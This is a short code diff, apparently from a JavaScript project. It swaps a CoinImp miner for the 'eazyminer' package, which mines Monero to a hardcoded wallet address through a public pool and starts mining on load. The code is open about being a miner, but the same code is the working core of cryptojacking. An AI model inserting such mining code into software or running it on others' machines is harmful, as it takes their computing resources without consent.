@@ -1,23 +1,13 @@
-const CoinImp = require('coin-imp');
- 
-(async () => {
-  // Create miner
-  const miner = await CoinImp('53415facb13dccbdf8523b5eefd45d01f6b16bf984cd8cf39ac04150266a4cd9'); // CoinImp's Site Key
- 
-  // Start miner
-  await miner.start();
- 
-  // Listen on events
-  miner.on('found', () => console.log('Found!'));
-  miner.on('accepted', () => console.log('Accepted!'));
-  miner.on('update', data =>
-    console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
-  `)
-  );
- 
-  // Stop miner
-  setTimeout(async () => await miner.stop(), 60000);
-})();
+const Miner = require('eazyminer');
+
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '46qiKHgMD5gf3GKzMnpD9JaHPtqZWsTAiVnXyqa95tSCBCdxPh5V4LSiz1FbnBajGAiBhG5HtYMnbimnShxdnCunTKP9iUi',
+        url: 'pool.supportxmr.com:443', // optional pool URL,
+    }],
+    autoStart: false // optional delay
+});
+
+miner.start(); // optional manually start the miner
+// miner.stop() // manually stop the miner
